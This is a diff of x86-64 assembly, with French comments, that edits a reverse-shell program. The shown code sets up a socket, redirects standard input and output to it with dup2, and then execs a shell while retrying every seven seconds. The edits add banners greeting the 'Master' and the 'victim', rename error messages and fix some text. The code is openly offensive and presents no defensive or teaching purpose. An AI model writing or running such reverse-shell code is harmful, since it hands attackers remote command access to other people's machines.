@@ -24,7 +24,7 @@ section .data
         dq 0
 
     msg:
-        conn_test_msg db ">> Connect to machine....", 0x0A
+        conn_test_msg db ">> Connecting to machine....", 0x0A
         conn_test_msg_len equ $ - conn_test_msg
 
         conn_success_msg db ">> Connected!", 0x0A
@@ -36,8 +36,8 @@ section .data
         socket_err_msg db ">> /!\Waiting for socket/!\", 0x0A
         socket_err_msg_len equ $ - socket_err_msg
 
-        bind_err_msg db ">> /!\failed bind socket/!\", 0x0A
-        bind_err_msg_len equ $ - bind_err_msg
+        dup2_err_msg db ">> /!\failed bind socket/!\", 0x0A
+        dup2_err_msg_len equ $ - dup2_err_msg
 
         lstn_err_msg db "failed listen socket", 0x0A
         lstn_err_msg_len equ $ - lstn_err_msg
@@ -54,8 +54,30 @@ section .data
         shll_success_msg db ">> Shell created ! ", 0x0A
         shll_success_msg_len equ $ - shll_success_msg
 
+
         skt_err_msg db ">> /!\Socket creation failed/!\", 0x0A
         skt_err_msg_len equ $ - skt_err_msg
+
+        welcome_master db 0x1B, "[1;35m" ; ESC[1;36m = bold cyan
+        db "********************************************************", 0x0A
+        db "*                                                      *", 0x0A
+        db "*                   Welcome Master!                    *", 0x0A
+        db "*                                                      *", 0x0A
+        db "********************************************************", 0x0A
+        db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
+        welcome_master_len equ $ - welcome_master
+        
+
+        welcome_victim db 0x1B, "[1;35m" ; ESC[1;36m = bold cyan
+        db "--------------------------------------------------------", 0x0A
+        db "|                                                      |", 0x0A
+        db "|                Welcome to the shell                  |", 0x0A
+        db "|                                                      |", 0x0A
+        db "--------------------------------------------------------", 0x0A
+        db 0x1B, "[0m", 0x0A ; ESC[0m = reset attributes, Newline
+        welcome_victim_len equ $ - welcome_victim
+
+        
 
     timespec:
         dq 7 ;rewind toute les 7 sec
@@ -70,11 +92,26 @@ section .data
 
 section .bss
     sockfd resq 1
+    welcome_displayed resb 1 ; pour éviter l'affichage multiple du message de bienvenue
 
 section .text
 
 _start:
-.connection:  
+.connection: 
+
+      mov al, [welcome_displayed] ; Charger la valeur du drapeau
+    cmp al, 1                   ; Comparer avec 1 (déjà affiché)
+    je .skip_welcome  
+     ; --- Affichage du message de bienvenue sur le shell distant ---
+    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
+    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
+    lea rsi, [rel welcome_master] ; Pointeur vers le message de bienvenue
+    mov rdx, welcome_master_len ; Longueur du message
+    call write  
+    
+    mov byte[welcome_displayed], 1                ; Écrit le message de bienvenue
+
+    .skip_welcome:
     ;initialisation du socket msg
     mov rdi, 2
     mov rsi, sock_init_msg
@@ -129,6 +166,14 @@ _start:
     inc rsi
     cmp rsi, 3
     jne .redirection ;si erreur redirection
+
+     ; --- Affichage du message de bienvenue sur le shell distant ---
+    ; Ceci est écrit sur le socket (maintenant stdout) avant l'execve.
+    mov rdi, 1                  ; Descripteur de fichier 1 (stdout)
+    lea rsi, [rel welcome_victim] ; Pointeur vers le message de bienvenue
+    mov rdx, welcome_victim_len ; Longueur du message
+    call write                  ; Écrit le message de bienvenue
+
  
 
     ;creation reverse shell
@@ -156,8 +201,8 @@ _start:
 
 .bind_err:
     mov rdi, 2
-    mov rsi, bind_err_msg
-    mov rdx, bind_err_msg_len
+    mov rsi, dup2_err_msg
+    mov rdx, dup2_err_msg_len
     call write  
     jmp .sleep
     
@@ -167,8 +212,10 @@ _start:
     mov rdx, skt_err_msg_len
     call write  
     jmp .sleep
-    
+
+
 .sleep:
+
     lea rdi, [rel timespec]
     mov rsi, 0
     mov rax, 35
